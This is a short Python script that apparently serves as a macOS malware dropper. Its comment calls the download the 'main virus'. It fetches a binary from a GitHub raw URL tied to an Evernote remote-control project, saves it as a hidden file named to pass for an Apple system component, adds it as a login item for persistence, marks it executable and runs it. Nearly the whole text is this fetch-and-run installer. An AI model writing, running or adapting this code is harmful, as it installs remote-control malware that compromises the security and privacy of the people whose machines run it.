from requests import get
from os.path import expanduser
from os import remove
from subprocess import Popen as subproc
from os import system

filename = "com.apple.com.user.core"
localfile = f"{expanduser('~')}/.{filename}"

# download main virus
open(localfile, 'wb').write(get("https://raw.githubusercontent.com/mrdog233o5/Remote-Control-With-Evernote/main/main", allow_redirects=True).content)

system(f"osascript -e 'tell application \"System Events\" to make login item at end with properties {{path:\"{expanduser('~')}/.{filename}\", hidden:false}}' > /dev/null")
system(f"chmod 555 {localfile}")

try:
    subproc([f"sudo localfile"])
except:
    subproc([localfile])
